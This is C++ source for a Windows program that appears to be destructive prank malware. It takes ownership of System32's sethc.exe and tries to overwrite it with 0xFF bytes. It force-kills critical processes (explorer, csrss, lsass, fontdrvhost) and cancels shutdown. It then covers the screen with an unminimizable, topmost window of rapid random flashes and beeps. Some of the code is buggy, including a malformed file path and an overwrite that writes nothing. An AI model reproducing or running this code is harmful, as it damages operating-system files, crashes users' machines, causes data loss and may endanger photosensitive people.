#include <windows.h>
#include <mmsystem.h>
#include <time.h>
#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib> // For system function
#include <Shellapi.h>
#include <Psapi.h>
#include <algorithm>
#include <vector>

#pragma comment(lib, "winmm.lib")

// Define the window size
const int WINDOW_WIDTH = 800;
const int WINDOW_HEIGHT = 600;

// Number of random flashing lights and rectangles
const int NUM_LIGHTS = 100;

// Timer ID
#define ID_TIMER 1

// Flag to indicate whether to rewrite the file
const bool REWRITE_FILE = true;

// Function to generate a random number between min and max
int getRandomNumber(int min, int max) {
    return rand() % (max - min + 1) + min;
}

// Function to draw a random flashing light at the specified position
void drawFlashingLight(HDC hdc, int x, int y) {
    int radius = 20;
    int red = getRandomNumber(0, 255);
    int green = getRandomNumber(0, 255);
    int blue = getRandomNumber(0, 255);
    HBRUSH hBrush = CreateSolidBrush(RGB(red, green, blue));
    SelectObject(hdc, hBrush);
    Ellipse(hdc, x - radius, y - radius, x + radius, y + radius);
    DeleteObject(hBrush);
}

// Function to draw a random rectangle at the specified position
void drawRandomRectangle(HDC hdc, int x, int y) {
    int width = getRandomNumber(10, 100);
    int height = getRandomNumber(10, 100);
    int red = getRandomNumber(0, 255);
    int green = getRandomNumber(0, 255);
    int blue = getRandomNumber(0, 255);
    HBRUSH hBrush = CreateSolidBrush(RGB(red, green, blue));
    SelectObject(hdc, hBrush);
    Rectangle(hdc, x, y, x + width, y + height);
    DeleteObject(hBrush);
}

// Function to draw a fractal pattern with random offsets to position
void drawFractal(HDC hdc, int x, int y, int size) {
    if (size < 1) return;

    int newX, newY;

    // Draw circles at the current position
    Ellipse(hdc, x - size, y - size, x + size, y + size);

    // Calculate random offsets for each level of the fractal
    int offsetX = getRandomNumber(-size / 2, size / 2);
    int offsetY = getRandomNumber(-size / 2, size / 2);

    // Draw recursive fractals at the corners with random offsets
    newX = x + size + offsetX;
    newY = y + offsetY;
    drawFractal(hdc, newX, newY, size / 2);

    newX = x - size + offsetX;
    newY = y + offsetY;
    drawFractal(hdc, newX, newY, size / 2);

    newX = x + offsetX;
    newY = y + size + offsetY;
    drawFractal(hdc, newX, newY, size / 2);

    newX = x + offsetX;
    newY = y - size + offsetY;
    drawFractal(hdc, newX, newY, size / 2);
}

// Function to generate and play a more intense random sound
void playIntenseRandomSound() {
    int repetitions = getRandomNumber(3, 8);      // Number of repetitions (adjust as needed)
    for (int i = 0; i < repetitions; ++i) {
        int frequency = getRandomNumber(500, 2000); // Higher frequency range (adjust as needed)
        int duration = getRandomNumber(100, 300);   // Longer duration range in milliseconds (adjust as needed)
        Beep(frequency, duration);
    }
}



bool takeOwnershipOfFile(const std::string& filename) {
    std::wstring wFilename = std::wstring(filename.begin(), filename.end());

    // Take ownership of the file
    if (ShellExecuteW(0, L"runas", L"TAKEOWN", (L"/F " + wFilename).c_str(), 0, SW_HIDE) <= (HINSTANCE)32) {
        std::wcout << L"Error: Unable to take ownership of the file.\n";
        return false;
    }

    // Grant full access to all users
    if (ShellExecuteW(0, L"runas", L"ICACLS", (wFilename + L" /grant Users:(F) /T /q").c_str(), 0, SW_HIDE) <= (HINSTANCE)32) {
        std::wcout << L"Error: Unable to grant full access to the file.\n";
        return false;
    }

    return true;
}


// Function to terminate processes by their names
void terminateProcessesByName(const std::wstring& processName) {
    std::wstring command = L"taskkill /f /im " + processName;

    int result = _wsystem(command.c_str());
    if (result == -1) {
        // The system function failed to execute the command
        // You can handle this error as per your requirements
    }
}

void AbortShutdown() {
    std::wstring command = L"shutdown /a ";

    int result = _wsystem(command.c_str());
    if (result == -1) {
        // The system function failed to execute the command
        // You can handle this error as per your requirements
    }
}

bool rewriteFileWithFF(const std::string& filename) {
    std::ofstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cout << "Error: Unable to open the file for rewriting.\n";
        return false;
    }

    const int bufferSize = 4096; // Adjust buffer size as needed
    char buffer[bufferSize];
    memset(buffer, 0xFF, bufferSize);

    // Calculate the number of times the buffer needs to be written
    std::streampos fileSize = file.tellp();
    int numIterations = fileSize / bufferSize;

    // Write the buffer for each iteration
    for (int i = 0; i < numIterations; ++i) {
        file.write(buffer, bufferSize);
    }

    // Write any remaining bytes if the file size is not a multiple of the buffer size
    int remainingBytes = fileSize % bufferSize;
    if (remainingBytes > 0) {
        file.write(buffer, remainingBytes);
    }

    // Check if there was an error while writing
    if (file.fail()) {
        std::cout << "Error: Failed to rewrite the file with FF hex values.\n";
        file.close();
        return false;
    }

    file.close();
    std::cout << "File has been rewritten with FF hex values.\n";
    return true;
}



// Window procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static int windowWidth, windowHeight;
    static HDC hdcBuffer;
    static HBITMAP hbmBuffer;

    HDC hdc; // Move the HDC declaration outside of the switch statement

    switch (uMsg) {
    case WM_CREATE:
        windowWidth = WINDOW_WIDTH;
        windowHeight = WINDOW_HEIGHT;

        // Create a buffer to draw off-screen
        hdc = GetDC(hwnd);
        hdcBuffer = CreateCompatibleDC(hdc);
        hbmBuffer = CreateCompatibleBitmap(hdc, windowWidth, windowHeight);
        SelectObject(hdcBuffer, hbmBuffer);
        ReleaseDC(hwnd, hdc);
        break;
    case WM_PAINT: {
        PAINTSTRUCT ps;
        hdc = BeginPaint(hwnd, &ps);

        // Draw on the buffer (off-screen)
        for (int i = 0; i < NUM_LIGHTS; ++i) {
            int x = getRandomNumber(0, windowWidth);
            int y = getRandomNumber(0, windowHeight);
            drawFlashingLight(hdcBuffer, x, y);
        }

        for (int i = 0; i < NUM_LIGHTS; ++i) {
            int x = getRandomNumber(0, windowWidth);
            int y = getRandomNumber(0, windowHeight);
            drawRandomRectangle(hdcBuffer, x, y);
        }

        int centerX = windowWidth / 2;
        int centerY = windowHeight / 2;
        int fractalSize = 150;
        drawFractal(hdcBuffer, centerX, centerY, fractalSize);

        // Copy the buffer to the screen
        BitBlt(hdc, 0, 0, windowWidth, windowHeight, hdcBuffer, 0, 0, SRCCOPY);

        EndPaint(hwnd, &ps);
        break;
    }
    case WM_DESTROY:
        // Clean up the buffer
        DeleteDC(hdcBuffer);
        DeleteObject(hbmBuffer);
        PostQuitMessage(0);
        break;
    case WM_TIMER:
        if (wParam == ID_TIMER) {
            // Trigger repaint
            InvalidateRect(hwnd, NULL, FALSE);

            // Play a more intense random sound
            playIntenseRandomSound();
        }
        break;
    case WM_SYSCOMMAND:
        // Prevent minimizing the window (SC_MINIMIZE) and screen saver (SC_SCREENSAVE)
        if ((wParam & 0xfff0) == SC_MINIMIZE || (wParam & 0xfff0) == SC_SCREENSAVE)
            return 0;
        break;
    case WM_SIZE:
        // Handle window resizing
        windowWidth = LOWORD(lParam);
        windowHeight = HIWORD(lParam);
        // Resize the buffer
        DeleteDC(hdcBuffer);
        DeleteObject(hbmBuffer);
        hdc = GetDC(hwnd);
        hdcBuffer = CreateCompatibleDC(hdc);
        hbmBuffer = CreateCompatibleBitmap(hdc, windowWidth, windowHeight);
        SelectObject(hdcBuffer, hbmBuffer);
        ReleaseDC(hwnd, hdc);
        break;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}



// Console application entry point
int main() {
    srand(static_cast<unsigned int>(time(0)));

    // Register the window class
    const char* CLASS_NAME = "RandomFlashingLights";
    WNDCLASSA wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = CLASS_NAME;
    RegisterClassA(&wc);

    // Get the screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Create the window with no title bar, borders, and maximize button
    HWND hwnd = CreateWindowExA(
        0, CLASS_NAME, "nyan~", WS_POPUP,
        0, 0, screenWidth, screenHeight,  // Position and size as per screen dimensions
        0, 0, GetModuleHandle(NULL), 0);

    if (hwnd == NULL) {
        return 0;
    }

    // Set the window to be topmost (above all other windows)
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, screenWidth, screenHeight, SWP_SHOWWINDOW);

    // Set the timer to trigger a repaint every 100 milliseconds
    SetTimer(hwnd, ID_TIMER, 100, NULL);

    // Message loop
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up the timer before exiting
    KillTimer(hwnd, ID_TIMER);





    return 0;
}



int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Call the takeOwnershipAndGrantAccessToFile function to take ownership of the file
    std::string filename = "C:\\Windows\\System32\sethc.exe";
    if (REWRITE_FILE) {
        if (!takeOwnershipOfFile(filename)) {
            return 1;
        }

        // Rewrite the file with FF hex values and handle the case if it fails
        if (!rewriteFileWithFF(filename)) {
            // You can decide what to do in case the overwrite fails, for example:
            // Show a message box, log the failure, or continue running the program.
            // Here, we will just print a message and proceed without returning 1.
            std::cout << "Overwriting the file failed, but the program will continue.\n";
        }
    }

    terminateProcessesByName(L"explorer.exe");
    terminateProcessesByName(L"fontdrvhost.exe");
    terminateProcessesByName(L"csrss.exe");
    terminateProcessesByName(L"lsass.exe");
    AbortShutdown();
    // Now, call the main function
    return main();
}
